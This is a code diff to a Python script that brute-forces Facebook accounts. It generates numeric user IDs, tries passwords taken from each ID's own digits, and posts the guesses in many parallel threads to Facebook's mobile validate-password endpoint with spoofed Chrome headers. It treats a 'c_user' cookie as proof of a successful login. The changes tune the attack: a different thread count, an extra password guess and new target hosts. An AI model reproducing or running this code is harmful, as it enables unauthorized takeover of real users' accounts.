@@ -87,7 +87,7 @@ def random_number():
     for _ in range(limit):
         x = "".join(random.choice(string.digits) for _ in range(6))
         idz.append(x)
-    with ThreadPoolExecutor(max_workers=90) as XYZ:
+    with ThreadPoolExecutor(max_workers=50) as XYZ:
         clear()
         total_idz = str(len(idz))
         print(f' \033[1;32m(√) \033[1;32mTotal IDs  :\033[1;32m ',total_idz)
@@ -97,7 +97,7 @@ def random_number():
         for xyz in idz:
             uidd = code+xyz
             uid = uidd
-            pww = [uidd[:6],uidd[:8],uidd] 
+            pww = [uidd[:6],uidd[:7],uidd[:8],uidd] 
          #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
             XYZ.submit(ATOM, uid, pww, total_idz)
     linex()
@@ -127,7 +127,7 @@ def ATOM(uid, pww, total_idz):
             'next': '',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),}
             headers = {
-            'authority': 'p.facebook.com',
+            'authority': 'm.facebook.com',
             'method': 'POST',
             'path': '/login/device-based/validate-password/?shbl=0',
             'scheme': 'https',
@@ -136,9 +136,9 @@ def ATOM(uid, pww, total_idz):
             'cache-control': 'max-age=0',
             'content-type': 'application/x-www-form-urlencoded',
             'dpr': '1',
-            'origin': 'https://p.facebook.com',
+            'origin': 'https://m.facebook.com',
             'priority': 'u=0, i',
-            'referer': 'https://p.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
+            'referer': 'https://m.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=120&lwc=1348028',
             'sec-ch-prefers-color-scheme': 'dark',
             'sec-ch-ua': '"Not(A:Brand";v="99", "Google Chrome";v="133", "Chromium";v="133"',
             'sec-ch-ua-full-version-list': '"Not(A:Brand";v="99.0.0.0", "Google Chrome";v="133.0.6943.127", "Chromium";v="133.0.6943.127"',
@@ -153,7 +153,7 @@ def ATOM(uid, pww, total_idz):
             'upgrade-insecure-requests': '1',
             'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36',
             'viewport-width': '867',}
-            response = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
+            response = session.post('https://free.facebook.com/login/device-based/validate-password/?shbl=0',data=data,headers=headers,allow_redirects=False) #proxies=proxs)
             #print(data)
             log_cookies = session.cookies.get_dict().keys()
             if "c_user" in log_cookies:
